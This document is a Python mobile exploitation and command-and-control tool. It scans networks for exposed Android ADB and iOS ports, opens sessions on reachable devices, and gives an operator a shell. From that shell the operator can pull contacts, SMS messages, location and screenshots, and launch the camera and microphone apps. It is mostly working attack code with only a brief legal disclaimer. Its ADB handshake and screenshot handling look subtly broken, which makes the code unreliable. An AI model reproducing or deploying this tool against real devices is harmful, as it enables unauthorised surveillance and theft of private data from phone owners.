#!/usr/bin/env python3
"""
MornySec-Mobile - Advanced Mobile Device Discovery, Exploitation & C2 Framework
Created by: Philip Morny
Version: 2.0.0 - For Authorized Testing Only
"""

import argparse
import ipaddress
import socket
import base64
import re
import threading
import time
import sys
import os
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from typing import Dict, List, Optional, Tuple

try:
    from colorama import init, Fore, Style
    init(autoreset=True)
except ImportError:
    class Fore:
        RED = '\033[91m'; GREEN = '\033[92m'; YELLOW = '\033[93m'
        BLUE = '\033[94m'; MAGENTA = '\033[95m'; CYAN = '\033[96m'
        WHITE = '\033[97m'; RESET = '\033[0m'
    class Style:
        RESET_ALL = '\033[0m'; BRIGHT = '\033[1m'

# ============================================
# UTILITY FUNCTIONS
# ============================================

def print_status(message: str, status_type: str = 'info'):
    """Print colored status messages"""
    colors = {
        'info': Fore.CYAN,
        'found': Fore.GREEN,
        'warning': Fore.YELLOW,
        'error': Fore.RED,
        'success': Fore.GREEN + Style.BRIGHT,
        'exploit': Fore.MAGENTA + Style.BRIGHT,
        'critical': Fore.RED + Style.BRIGHT,
        'c2': Fore.BLUE + Style.BRIGHT,
        'output': Fore.GREEN
    }
    color = colors.get(status_type, Fore.WHITE)
    print(f"{color}{message}{Style.RESET_ALL}")

def print_banner():
    """Display tool banner"""
    print_status("""
    ╔═══════════════════════════════════════════════════════════╗
    ║   📱 MornySec-Mobile v2.0.0                             ║
    ║   Mobile Discovery, Exploitation & C2 Framework          ║
    ║   Created by: Philip Morny                               ║
    ║   For Authorized Security Testing Only                   ║
    ╚═══════════════════════════════════════════════════════════╝
    """, 'info')

# ============================================
# CONFIGURATION
# ============================================

VERSION = "2.0.0"
AUTHOR = "Philip Morny"
REPO_URL = "https://github.com/cyberobinhood/MornySec-Mobile"

# ============================================
# SESSION MANAGEMENT
# ============================================

class SessionManager:
    """Manage active sessions with compromised devices"""
    
    def __init__(self):
        self.sessions = {}
        self.session_id = 0
    
    def create_session(self, device_ip: str, exploit_type: str, connection) -> int:
        """Create a new session for a compromised device"""
        self.session_id += 1
        session = {
            'id': self.session_id,
            'ip': device_ip,
            'exploit_type': exploit_type,
            'connection': connection,
            'created': datetime.now(),
            'last_active': datetime.now(),
            'commands_executed': 0,
            'output_log': []
        }
        self.sessions[self.session_id] = session
        return self.session_id
    
    def get_session(self, session_id: int) -> Optional[Dict]:
        """Get session by ID"""
        return self.sessions.get(session_id)
    
    def list_sessions(self) -> List[Dict]:
        """List all active sessions"""
        return list(self.sessions.values())
    
    def remove_session(self, session_id: int):
        """Remove a session"""
        if session_id in self.sessions:
            del self.sessions[session_id]
    
    def execute_command(self, session_id: int, command: str) -> Dict:
        """Execute command on session"""
        session = self.get_session(session_id)
        if not session:
            return {'success': False, 'error': 'Session not found'}
        
        session['last_active'] = datetime.now()
        
        if session['exploit_type'] == 'adb':
            return self._execute_adb_command(session, command)
        else:
            return {'success': False, 'error': 'Unknown exploit type'}
    
    def _execute_adb_command(self, session: Dict, command: str) -> Dict:
        """Execute command via ADB"""
        try:
            ip = session['ip']
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((ip, 5555))
            
            sock.send(b'CNXN\x00\x00\x00\x01\x00\x00\x00\x00\x10\x00\x00\x00')
            response = sock.recv(1024)
            
            if response and b'OKAY' in response:
                cmd = f"shell:{command}\n".encode()
                sock.send(cmd)
                output = sock.recv(8192)
                sock.close()
                
                return {
                    'success': True,
                    'output': output.decode('utf-8', errors='ignore'),
                    'command': command
                }
            else:
                return {'success': False, 'error': 'ADB connection failed'}
        except Exception as e:
            return {'success': False, 'error': str(e)}

# ============================================
# C2 INTERFACE
# ============================================

class C2Interface:
    """Command & Control Interface for compromised devices"""
    
    def __init__(self, session_manager: SessionManager):
        self.session_manager = session_manager
        self.running = True
        self.current_session = None
    
    def show_help(self):
        """Display C2 help menu"""
        print_status("""
╔═══════════════════════════════════════════════════════════════╗
║  📱 C2 COMMANDS                                              ║
╠═══════════════════════════════════════════════════════════════╣
║  sessions              - List all active sessions             ║
║  select <id>           - Select a session to interact with    ║
║  shell                 - Open interactive shell on session    ║
║  exec <command>        - Execute command on selected session  ║
║  screenshot            - Capture device screenshot            ║
║  contacts              - Extract contacts                     ║
║  sms                   - Extract SMS messages                 ║
║  location              - Get device location                  ║
║  cam                   - Access camera                        ║
║  mic                   - Access microphone                    ║
║  info                  - Get device information               ║
║  kill                  - Terminate session                    ║
║  clear                 - Clear screen                         ║
║  help                  - Show this help                       ║
║  exit                  - Exit C2 interface                    ║
╚═══════════════════════════════════════════════════════════════╝
        """, 'info')
    
    def run(self):
        """Run the C2 interface"""
        print_status("\n[*] C2 Interface Activated", 'c2')
        print_status("[*] Type 'help' for available commands", 'info')
        print_status(f"[*] Active sessions: {len(self.session_manager.list_sessions())}", 'info')
        print_status("="*60, 'info')
        
        while self.running:
            try:
                if self.current_session:
                    prompt = f"📱[{self.current_session['id']}@{self.current_session['ip']}]> "
                else:
                    prompt = "📱[C2]> "
                
                command = input(prompt).strip()
                
                if not command:
                    continue
                
                parts = command.split()
                cmd = parts[0].lower()
                args = parts[1:] if len(parts) > 1 else []
                
                self.execute_c2_command(cmd, args)
                
            except KeyboardInterrupt:
                print_status("\n[!] Use 'exit' to quit", 'warning')
            except Exception as e:
                print_status(f"[!] Error: {e}", 'error')
    
    def execute_c2_command(self, cmd: str, args: List[str]):
        """Execute C2 commands"""
        if cmd == 'help':
            self.show_help()
        
        elif cmd == 'sessions':
            self.list_sessions()
        
        elif cmd == 'select':
            if not args:
                print_status("[!] Usage: select <session_id>", 'error')
                return
            try:
                session_id = int(args[0])
                session = self.session_manager.get_session(session_id)
                if session:
                    self.current_session = session
                    print_status(f"[+] Selected session {session_id} on {session['ip']}", 'success')
                else:
                    print_status(f"[!] Session {session_id} not found", 'error')
            except ValueError:
                print_status("[!] Invalid session ID", 'error')
        
        elif cmd == 'shell':
            if not self.current_session:
                print_status("[!] No session selected. Use 'select <id>' first", 'error')
                return
            self.interactive_shell()
        
        elif cmd == 'exec':
            if not self.current_session:
                print_status("[!] No session selected. Use 'select <id>' first", 'error')
                return
            if not args:
                print_status("[!] Usage: exec <command>", 'error')
                return
            command = ' '.join(args)
            self.execute_command(command)
        
        elif cmd == 'info':
            if not self.current_session:
                print_status("[!] No session selected. Use 'select <id>' first", 'error')
                return
            self.get_device_info()
        
        elif cmd == 'screenshot':
            if not self.current_session:
                print_status("[!] No session selected. Use 'select <id>' first", 'error')
                return
            self.capture_screenshot()
        
        elif cmd == 'contacts':
            if not self.current_session:
                print_status("[!] No session selected. Use 'select <id>' first", 'error')
                return
            self.extract_contacts()
        
        elif cmd == 'sms':
            if not self.current_session:
                print_status("[!] No session selected. Use 'select <id>' first", 'error')
                return
            self.extract_sms()
        
        elif cmd == 'location':
            if not self.current_session:
                print_status("[!] No session selected. Use 'select <id>' first", 'error')
                return
            self.get_location()
        
        elif cmd == 'cam':
            if not self.current_session:
                print_status("[!] No session selected. Use 'select <id>' first", 'error')
                return
            self.access_camera()
        
        elif cmd == 'mic':
            if not self.current_session:
                print_status("[!] No session selected. Use 'select <id>' first", 'error')
                return
            self.access_microphone()
        
        elif cmd == 'kill':
            if not args:
                if self.current_session:
                    session_id = self.current_session['id']
                    self.session_manager.remove_session(session_id)
                    self.current_session = None
                    print_status(f"[+] Session {session_id} terminated", 'success')
                else:
                    print_status("[!] No session selected", 'error')
            else:
                try:
                    session_id = int(args[0])
                    self.session_manager.remove_session(session_id)
                    if self.current_session and self.current_session['id'] == session_id:
                        self.current_session = None
                    print_status(f"[+] Session {session_id} terminated", 'success')
                except ValueError:
                    print_status("[!] Invalid session ID", 'error')
        
        elif cmd == 'clear':
            os.system('clear' if os.name == 'posix' else 'cls')
        
        elif cmd == 'exit':
            print_status("[*] Exiting C2 interface...", 'info')
            self.running = False
        
        else:
            print_status(f"[!] Unknown command: {cmd}. Type 'help' for available commands.", 'error')
    
    def list_sessions(self):
        """List all active sessions"""
        sessions = self.session_manager.list_sessions()
        if not sessions:
            print_status("[!] No active sessions", 'warning')
            return
        
        print_status("\n📱 ACTIVE SESSIONS", 'c2')
        print_status("="*60, 'info')
        print(f"{'ID':<6} {'IP':<20} {'Exploit':<15} {'Commands':<10} {'Last Active':<20}")
        print("-"*60)
        
        for session in sessions:
            last_active = session['last_active'].strftime('%H:%M:%S')
            print(f"{session['id']:<6} {session['ip']:<20} {session['exploit_type']:<15} "
                  f"{session['commands_executed']:<10} {last_active:<20}")
        print()
    
    def interactive_shell(self):
        """Open interactive shell on selected device"""
        if not self.current_session:
            return
        
        session_id = self.current_session['id']
        ip = self.current_session['ip']
        
        print_status(f"\n[*] Opening interactive shell on {ip}", 'info')
        print_status("[*] Type 'exit' to return to C2", 'info')
        print_status("="*60, 'info')
        
        while True:
            try:
                cmd = input(f"${ip}> ").strip()
                if cmd.lower() == 'exit':
                    break
                if cmd:
                    result = self.session_manager.execute_command(session_id, cmd)
                    if result.get('success'):
                        print_status(result.get('output', ''), 'output')
                    else:
                        print_status(f"[!] Command failed: {result.get('error', 'Unknown error')}", 'error')
            except KeyboardInterrupt:
                print_status("\n[!] Use 'exit' to return to C2", 'warning')
            except Exception as e:
                print_status(f"[!] Error: {e}", 'error')
    
    def execute_command(self, command: str):
        """Execute single command on selected session"""
        if not self.current_session:
            return
        
        session_id = self.current_session['id']
        result = self.session_manager.execute_command(session_id, command)
        
        if result.get('success'):
            print_status("Command executed successfully:", 'success')
            print_status(result.get('output', ''), 'output')
        else:
            print_status(f"[!] Command failed: {result.get('error', 'Unknown error')}", 'error')
    
    def get_device_info(self):
        """Get detailed device information"""
        if not self.current_session:
            return
        
        session_id = self.current_session['id']
        ip = self.current_session['ip']
        
        print_status(f"\n[*] Gathering device info for {ip}", 'info')
        print_status("="*60, 'info')
        
        commands = [
            'getprop ro.product.model',
            'getprop ro.product.manufacturer',
            'getprop ro.build.version.release',
            'getprop ro.build.version.sdk',
            'getprop ro.product.brand',
            'df -h',
            'free -h',
            'whoami'
        ]
        
        for cmd in commands:
            result = self.session_manager.execute_command(session_id, cmd)
            if result.get('success'):
                output = result.get('output', '').strip()
                if output:
                    print_status(f"{cmd}: {output}", 'info')
            time.sleep(0.5)
        
        print_status("="*60, 'info')
    
    def capture_screenshot(self):
        """Capture screenshot from device"""
        if not self.current_session:
            return
        
        session_id = self.current_session['id']
        ip = self.current_session['ip']
        
        print_status(f"[*] Capturing screenshot from {ip}", 'info')
        
        result = self.session_manager.execute_command(session_id, 'screencap -p /sdcard/screenshot.png')
        
        if result.get('success'):
            download_result = self.session_manager.execute_command(
                session_id, 
                'cat /sdcard/screenshot.png'
            )
            if download_result.get('success'):
                filename = f"screenshot_{ip}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
                with open(filename, 'wb') as f:
                    f.write(download_result.get('output', '').encode())
                print_status(f"[+] Screenshot saved: {filename}", 'success')
            else:
                print_status("[!] Failed to download screenshot", 'error')
        else:
            print_status("[!] Screenshot capture failed", 'error')
    
    def extract_contacts(self):
        """Extract contacts from device"""
        if not self.current_session:
            return
        
        session_id = self.current_session['id']
        ip = self.current_session['ip']
        
        print_status(f"[*] Extracting contacts from {ip}", 'info')
        
        result = self.session_manager.execute_command(
            session_id,
            'content query --uri content://contacts/people/'
        )
        
        if result.get('success'):
            filename = f"contacts_{ip}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            with open(filename, 'w') as f:
                f.write(result.get('output', ''))
            print_status(f"[+] Contacts saved: {filename}", 'success')
        else:
            print_status("[!] Failed to extract contacts", 'error')
    
    def extract_sms(self):
        """Extract SMS messages"""
        if not self.current_session:
            return
        
        session_id = self.current_session['id']
        ip = self.current_session['ip']
        
        print_status(f"[*] Extracting SMS from {ip}", 'info')
        
        result = self.session_manager.execute_command(
            session_id,
            'content query --uri content://sms/inbox'
        )
        
        if result.get('success'):
            filename = f"sms_{ip}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            with open(filename, 'w') as f:
                f.write(result.get('output', ''))
            print_status(f"[+] SMS saved: {filename}", 'success')
        else:
            print_status("[!] Failed to extract SMS", 'error')
    
    def get_location(self):
        """Get device location"""
        if not self.current_session:
            return
        
        session_id = self.current_session['id']
        ip = self.current_session['ip']
        
        print_status(f"[*] Getting location from {ip}", 'info')
        
        result = self.session_manager.execute_command(
            session_id,
            'dumpsys location'
        )
        
        if result.get('success'):
            output = result.get('output', '')
            lat_match = re.search(r'latitude=([\d.]+)', output)
            lon_match = re.search(r'longitude=([\d.]+)', output)
            
            if lat_match and lon_match:
                lat = lat_match.group(1)
                lon = lon_match.group(1)
                print_status(f"[+] Location: {lat}, {lon}", 'success')
                maps_url = f"https://www.google.com/maps?q={lat},{lon}"
                print_status(f"    Maps: {maps_url}", 'info')
            else:
                print_status("[!] No location data available", 'warning')
        else:
            print_status("[!] Failed to get location", 'error')
    
    def access_camera(self):
        """Access device camera"""
        if not self.current_session:
            return
        
        session_id = self.current_session['id']
        ip = self.current_session['ip']
        
        print_status(f"[*] Accessing camera on {ip}", 'info')
        
        result = self.session_manager.execute_command(
            session_id,
            'am start -a android.media.action.IMAGE_CAPTURE'
        )
        
        if result.get('success'):
            print_status("[+] Camera app launched", 'success')
        else:
            print_status("[!] Failed to access camera", 'error')
    
    def access_microphone(self):
        """Access device microphone"""
        if not self.current_session:
            return
        
        session_id = self.current_session['id']
        ip = self.current_session['ip']
        
        print_status(f"[*] Accessing microphone on {ip}", 'info')
        
        result = self.session_manager.execute_command(
            session_id,
            'am start -a android.provider.MediaStore.RECORD_SOUND'
        )
        
        if result.get('success'):
            print_status("[+] Voice recorder launched", 'success')
        else:
            print_status("[!] Failed to access microphone", 'error')

# ============================================
# MOBILE DEVICE DISCOVERY
# ============================================

class MobileDiscovery:
    """Discover mobile devices on the network"""
    
    def __init__(self, timeout: int = 5):
        self.timeout = timeout
    
    def check_adb(self, ip: str) -> Optional[Dict]:
        """Check ADB service on Android device"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((ip, 5555))
            
            sock.send(b'CNXN\x00\x00\x00\x01\x00\x00\x00\x00\x10\x00\x00\x00')
            response = sock.recv(1024)
            sock.close()
            
            if response and b'OKAY' in response:
                return {'status': 'connected', 'info': 'ADB service detected'}
        except:
            pass
        return None
    
    def check_port(self, ip: str, port: int) -> bool:
        """Check if port is open"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((ip, port))
            sock.close()
            return result == 0
        except:
            return False
    
    def scan_ip(self, ip: str) -> Dict:
        """Scan single IP for mobile device indicators"""
        result = {
            'ip': ip,
            'is_mobile': False,
            'os': 'Unknown',
            'vendor': 'Unknown',
            'ports': [],
            'services': {}
        }
        
        ports_to_check = [5555, 62078, 5353, 22, 80, 443, 8080, 5037]
        open_ports = []
        
        for port in ports_to_check:
            if self.check_port(ip, port):
                open_ports.append(port)
        
        if open_ports:
            result['ports'] = open_ports
            
            if 5555 in open_ports:
                adb_info = self.check_adb(ip)
                if adb_info:
                    result['is_mobile'] = True
                    result['os'] = 'Android'
                    result['services']['adb'] = adb_info
            
            if 62078 in open_ports:
                result['is_mobile'] = True
                if result['os'] == 'Unknown':
                    result['os'] = 'iOS'
                result['services']['lockdown'] = {'status': 'connected'}
        
        return result
    
    def scan_network(self, network: str) -> List[Dict]:
        """Scan network for mobile devices"""
        devices = []
        
        try:
            net = ipaddress.ip_network(network, strict=False)
            hosts = list(net.hosts())[:254]
            
            print_status(f"[*] Scanning {len(hosts)} hosts for mobile devices...", 'info')
            
            with ThreadPoolExecutor(max_workers=50) as executor:
                future_to_ip = {executor.submit(self.scan_ip, str(ip)): str(ip) for ip in hosts}
                
                for future in as_completed(future_to_ip):
                    ip = future_to_ip[future]
                    try:
                        result = future.result(timeout=5)
                        if result and result.get('is_mobile', False):
                            devices.append(result)
                            print_status(f"[+] Found mobile device: {result['ip']} ({result['os']})", 'found')
                    except:
                        pass
            
        except Exception as e:
            print_status(f"[!] Network scan error: {e}", 'error')
        
        return devices

# ============================================
# EXPLOITATION ENGINE
# ============================================

class ExploitEngine:
    """Execute exploits against vulnerable devices"""
    
    def __init__(self, session_manager: SessionManager, verbose: bool = False):
        self.session_manager = session_manager
        self.verbose = verbose
        self.exploit_results = []
    
    def exploit_adb(self, ip: str) -> Dict:
        """Attempt ADB exploitation and create session"""
        result = {
            'success': False,
            'type': 'ADB Exploitation',
            'output': '',
            'session_id': None
        }
        
        try:
            print_status(f"[*] Attempting ADB exploitation on {ip}", 'info')
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((ip, 5555))
            
            sock.send(b'CNXN\x00\x00\x00\x01\x00\x00\x00\x00\x10\x00\x00\x00')
            response = sock.recv(1024)
            
            if response and b'OKAY' in response:
                result['success'] = True
                result['output'] = 'ADB connection established'
                print_status(f"[+] ADB Exploit successful on {ip}", 'success')
                
                session_id = self.session_manager.create_session(ip, 'adb', sock)
                result['session_id'] = session_id
                print_status(f"[+] Session {session_id} created for {ip}", 'success')
            
            sock.close()
            
        except Exception as e:
            if self.verbose:
                print_status(f"[!] ADB exploit error: {e}", 'error')
        
        return result

# ============================================
# MAIN SCANNER
# ============================================

class MornySecMobile:
    """Main mobile device scanner and exploitation framework"""
    
    def __init__(self, args):
        self.args = args
        self.discovery = MobileDiscovery(timeout=args.timeout)
        self.session_manager = SessionManager()
        self.exploit_engine = ExploitEngine(self.session_manager, verbose=args.verbose)
        self.devices = []
        self.c2_interface = C2Interface(self.session_manager)
    
    def scan(self) -> List[Dict]:
        """Scan network for mobile devices"""
        network = self.args.target
        
        try:
            ipaddress.ip_address(network)
            result = self.discovery.scan_ip(network)
            if result.get('is_mobile'):
                self.devices.append(result)
                print_status(f"[+] Found mobile device: {result['ip']} ({result['os']})", 'found')
        except:
            self.devices = self.discovery.scan_network(network)
        
        return self.devices
    
    def exploit(self, target_ip: Optional[str] = None):
        """Execute exploits on discovered devices"""
        print_status("\n[*] Starting exploitation phase...", 'info')
        print_status("="*60, 'info')
        
        devices_to_exploit = []
        
        if target_ip:
            for device in self.devices:
                if device['ip'] == target_ip:
                    devices_to_exploit.append(device)
                    break
            if not devices_to_exploit:
                print_status(f"[!] Device {target_ip} not found", 'error')
                return
        else:
            for device in self.devices:
                if 'adb' in device.get('services', {}):
                    devices_to_exploit.append(device)
        
        if not devices_to_exploit:
            print_status("[!] No exploitable devices found", 'warning')
            return
        
        print_status(f"[*] Exploiting {len(devices_to_exploit)} devices", 'info')
        
        for device in devices_to_exploit:
            ip = device['ip']
            
            print_status(f"\n[*] Targeting {ip} ({device.get('os', 'Unknown')})", 'info')
            
            if 'adb' in device.get('services', {}):
                result = self.exploit_engine.exploit_adb(ip)
                if result['success']:
                    print_status(f"[+] ADB exploit successful on {ip}", 'success')
    
    def start_c2(self):
        """Start the Command & Control interface"""
        if not self.session_manager.list_sessions():
            print_status("[!] No active sessions. Exploit a device first.", 'warning')
            return
        
        print_status("\n[*] Starting Command & Control Interface", 'c2')
        self.c2_interface.run()
    
    def report(self):
        """Generate comprehensive report"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        report_name = f"MornySec_Mobile_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        
        with open(report_name, 'w', encoding='utf-8') as f:
            f.write("="*70 + "\n")
            f.write("📱 MORNY-SEC MOBILE SECURITY REPORT\n")
            f.write(f"Generated: {timestamp}\n")
            f.write(f"Tool: MornySec-Mobile {VERSION}\n")
            f.write(f"Author: {AUTHOR}\n")
            f.write("="*70 + "\n\n")
            
            if self.devices:
                f.write("📱 DEVICES DISCOVERED\n")
                f.write("-"*70 + "\n\n")
                
                for idx, device in enumerate(self.devices, 1):
                    f.write(f"[{idx}] {device['ip']}\n")
                    f.write(f"    OS: {device.get('os', 'Unknown')}\n")
                    f.write(f"    Ports: {device.get('ports', [])}\n")
                    if device.get('services'):
                        f.write(f"    Services: {list(device['services'].keys())}\n")
                    f.write("\n")
            
            if self.session_manager.list_sessions():
                f.write("\n💥 ACTIVE SESSIONS\n")
                f.write("-"*70 + "\n\n")
                
                for session in self.session_manager.list_sessions():
                    f.write(f"[{session['id']}] {session['ip']}\n")
                    f.write(f"    Exploit: {session['exploit_type']}\n")
                    f.write(f"    Commands: {session['commands_executed']}\n")
                    f.write("\n")
        
        print_status(f"\n📄 Security report saved to: {report_name}", 'success')

# ============================================
# MAIN ENTRY POINT
# ============================================

def main():
    parser = argparse.ArgumentParser(
        description='MornySec-Mobile - Advanced Mobile Device Discovery & Exploitation',
        epilog=f'Example: python MornySec-Mobile.py 192.168.1.0/24 --exploit --c2\n\n'
               f'Author: {AUTHOR}\n'
               f'Repository: {REPO_URL}',
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    
    parser.add_argument('target', help='Target IP or CIDR range')
    parser.add_argument('-t', '--threads', default=30, type=int,
                       help='Number of threads (default: 30)')
    parser.add_argument('--timeout', default=5, type=int,
                       help='Connection timeout (default: 5)')
    parser.add_argument('-s', '--scan', action='store_true',
                       help='Scan for mobile devices')
    parser.add_argument('-e', '--exploit', action='store_true',
                       help='Automatically exploit vulnerabilities')
    parser.add_argument('--c2', action='store_true',
                       help='Start Command & Control interface')
    parser.add_argument('--target-ip', help='Exploit specific device by IP')
    parser.add_argument('-v', '--verbose', action='store_true',
                       help='Verbose output')
    parser.add_argument('--version', action='version',
                       version=f'MornySec-Mobile {VERSION}')
    
    args = parser.parse_args()
    
    # Show banner
    print_banner()
    
    print_status("⚠️  LEGAL NOTICE: Only use on networks you own or have", 'warning')
    print_status("   explicit authorization to test.", 'warning')
    print_status(f"   Repository: {REPO_URL}", 'info')
    print()
    
    # Initialize scanner
    scanner = MornySecMobile(args)
    
    # Run scan if requested
    if args.scan or args.exploit:
        print_status("[*] Starting device discovery...", 'info')
        devices = scanner.scan()
        
        if not devices:
            print_status("[!] No mobile devices found", 'error')
            sys.exit(1)
        
        # Generate report
        scanner.report()
        
        # Run exploits if requested
        if args.exploit:
            scanner.exploit(args.target_ip)
    
    # Start C2 interface
    if args.c2:
        scanner.start_c2()
    
    if not args.scan and not args.exploit and not args.c2:
        parser.print_help()

if __name__ == '__main__':
    main()
